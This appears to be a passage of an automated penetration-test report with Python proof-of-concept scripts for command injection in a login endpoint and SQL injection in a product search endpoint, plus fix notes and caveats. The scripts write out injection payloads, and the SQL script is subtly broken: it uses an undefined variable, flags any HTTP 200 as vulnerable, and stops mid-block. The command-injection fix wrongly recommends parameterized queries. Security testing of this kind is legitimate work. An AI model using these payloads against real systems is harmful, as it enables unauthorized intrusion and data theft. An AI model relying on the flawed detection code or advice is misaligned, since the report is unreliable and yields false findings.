### W-005 — reproduction

Demonstrates command injection vulnerability in email and password parameters of POST /rest/user/login endpoint by injecting OS commands

```python
import requests
import sys

def test_command_injection(base_url):
    try:
        # Test command injection in email parameter
        payload_email = "test@example.com; echo vulnerable_cmd_injection"
        response_email = requests.post(f"{base_url}/rest/user/login", data={
            "email": payload_email,
            "password": "password123"
        })
        
        # Test command injection in password parameter
        payload_password = "password123; echo vulnerable_cmd_injection"
        response_password = requests.post(f"{base_url}/rest/user/login", data={
            "email": "test@example.com",
            "password": payload_password
        })
        
        # Check if command injection was successful
        if "vulnerable_cmd_injection" in response_email.text or "vulnerable_cmd_injection" in response_password.text:
            print("[VULNERABLE] Command Injection reproduced in /rest/user/login")
            return True
        else:
            print("[NOT VULNERABLE] Command Injection not detected")
            return False
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <base_url>")
        sys.exit(1)
    test_command_injection(sys.argv[1])
```

**Fix.** Sanitize and validate all user inputs, especially those used in system commands. Use parameterized queries and avoid direct concatenation of user input into command strings.

### W-008 — reproduction

Demonstrates SQL injection vulnerability in the q parameter of GET /rest/products/search endpoint by injecting malicious SQL payloads

```python
import requests
import sys

def test_sql_injection(base_url):
    try:
        # Test SQL injection in search parameter q
        payload = "test' OR '1'='1"
        response = requests.get(f"{base_url}/rest/products/search", params={"q": payload})
        
        # Alternative payload to confirm SQL injection
        payload2 = "test' UNION SELECT null,null,null,null,null,null,null--"
        response2 = requests.get(f"{base_url}/rest/products/search", params={"q": payload2})
        
        # Check for indicators of SQL injection success
        if response.status_code == 200 and ("error" in response.text.lower() or len(response.json()) > expected_results):
            print("[VULNERABLE] SQL Injection reproduced in /rest/products/search")
            return True
        elif response2.status_code == 200:
            print("[VULNERABLE] SQL Injection reproduced with UNION payload")
            return True
        else:
            print("[NOT VULNERABLE] SQL Injection not detected")
            return False
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
```

**Fix.** Use parameterized queries or prepared statements instead of string concatenation. Implement proper input validation and sanitize user inputs before using them in SQL queries.

## Caveats and limitations

These bound how far the results above can be relied on.

- Produced by an autonomous pipeline with no human review. Findings should be validated by a security engineer before remediation is prioritised or the results are shared externally.
- The crawl hit a configured limit after 5 pages, so the asset map is a lower bound and parts of the application were never seen.
- API routes were extracted from client-side JavaScript. They are candidate routes the application references, not a verified inventory of its endpoints.
- 40 of 42 findings were not proven exploitable (W-001, W-002, W-003, W-004, W-006, W-007, W-009, W-010, …). They are hypotheses based on observed assets, not demonstrated vulnerabilities.
- 34 findings were never tested for exploitability (W-009, W-010, W-011, W-012, W-013, W-014, W-015, W-016). No claim is made about them either way.
- Absence of a finding is not evidence of absence. This engagement covered what the crawler reached within its configured bounds.
